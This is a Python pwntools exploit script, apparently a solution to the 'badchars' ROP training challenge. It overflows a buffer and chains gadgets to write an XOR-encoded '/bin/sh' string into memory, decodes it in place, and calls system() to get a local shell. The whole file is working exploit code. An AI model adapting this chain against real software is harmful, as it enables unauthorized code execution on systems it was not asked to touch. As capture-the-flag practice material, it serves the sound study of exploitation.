
#
##### Exploit #####
#
from pwn import *

#xor string by given value char by char
def xorstr(string,value):
    result = ""
    for c in string:
        result += chr(value^ord(c))
    return result


string = "/bin/sh\x00"
#string = "aaaaaaaa" #use this to test xor gadget works

#binary addresses
system_addr = 0x004006f0
target_addr = 0x00601074

#pop gadgets
pop_r12_r13 = 0x00400b3b
pop_r14_r15 = 0x00400b40
pop_rdi = 0x00400b39

#move gadgets
move_r12_into_r13 = 0x00400b34 #mov qword [r13], r12

#xor gadgets
xor_r14_r15 = 0x00400b30 #xor byte [r15], r14b

#what are we going to xor by?
xorvalue = 34

#convert our /bin/sh\x00 into \x0fBIN\x0fSH
xor_binsh = xorstr(string,xorvalue)

#overflow the buffer
exploit = "A" * 40

#Prepare registers r12, r13 to move our target string
exploit += p64(pop_r12_r13)
exploit += xor_binsh
exploit += p64(target_addr)

#Move XOR'd string into target
exploit += p64(move_r12_into_r13)

#exploit to reverse xor byte by byte
#Note we need to iterate along the length of our /bin/sh string
#and xor each byte with our xorvalue
#ie: AAAAAAAA -> AAAAAAAa -> AAAAAAaa -> AAAAAaaa etc
for cnt in range(0,len(string)):
    exploit += p64(pop_r14_r15)
    exploit += p64(xorvalue)
    exploit += p64(target_addr + cnt)
    exploit += p64(xor_r14_r15)

#get our shell!
exploit += p64(pop_rdi)
exploit += p64(target_addr)
exploit += p64(system_addr)

r = process("./badchars")
r.sendline(exploit)

r.interactive()


 